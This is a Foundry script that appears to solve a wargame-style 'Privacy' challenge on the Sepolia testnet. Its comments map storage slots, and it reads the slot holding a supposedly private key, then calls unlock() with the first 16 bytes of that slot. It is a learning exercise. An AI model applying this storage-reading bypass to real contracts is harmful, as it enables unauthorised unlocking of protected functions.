// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Privacy} from "../src/Privacy.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0x6cf909ac30f55d920a58d4428bc6438ae7edd0c9

contract PrivacySolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Privacy.s.sol --tc PrivacySolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    Privacy privacyInstance = Privacy(0x6CF909aC30F55D920A58D4428Bc6438AE7EDd0c9);

    function run() external {
        // Deploy Privacy contract (It is better to deploy your instance for the contract to avoid errors)
        if (address(privacyInstance) == address(0)) {
            privacyInstance = _deployPrivacyContract();
        }
        // We will simulate the attack by the second address, whici is in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // - In the `Privacy` contract, to unlock the contract we need to know the value of the third element in the data element, then we need to get the first 16 bytes of it.
        // - The variables are private, but since the Ethereum blockchain is public we can see everything.
        // - Each slot in the EVM storage occupies 32 bytes, so let us know where are our variables.
        // - In the case of fixed size array elements are placed in the slot in sequence.
        // -
        //      - slot0: locked
        //      - slot1: ID
        //      - slot2: flattening && denomination && awkwardness
        //      - slot3: data[0]
        //      - slot4: data[1]
        //      - slot5: data[2]
        //
        // - So we can simply read the 5th slot in the storage, then cast it into bytes16() and we will get the right key that will unlock the Privacy contract, and pass the challenge.
        // - Here is how to cast storage in Foundry:
        //  `cast storage <CONTRACT_ADDRESS> <STORAGE_SLOT> --rpc-url <RPC_URL>`

        // How to read the Storage variables using Foundry:
        // source .env    # If you didn't reference to your environmental variables
        // cast storage <CONTRACT_ADDRESS> <STORAGE_SLOT> --rpc-url $SEPOLIA_RPC_URL
        console.log("Privacy lock:", privacyInstance.locked());
        privacyInstance.unlock(0x97fc46276c172633607a331542609db1);
        console.log("Privacy lock:", privacyInstance.locked());

        vm.stopBroadcast();
    }

    function _deployPrivacyContract() internal returns (Privacy) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        // You can use any three wards to make your data
        bytes32[3] memory data = _createData("password", "hash", "string");
        Privacy privacyInstance = new Privacy(data);
        console.log("Privacy address:", address(privacyInstance));
        vm.stopBroadcast();
        return privacyInstance;
    }

    function _createData(string memory str1, string memory str2, string memory str3)
        internal
        pure
        returns (bytes32[3] memory)
    {
        bytes32 hashing1 = keccak256(bytes(str1));
        bytes32 hashing2 = keccak256(bytes(str2));
        bytes32 hashing3 = keccak256(bytes(str3));

        return [hashing1, hashing2, hashing3];
    }
}
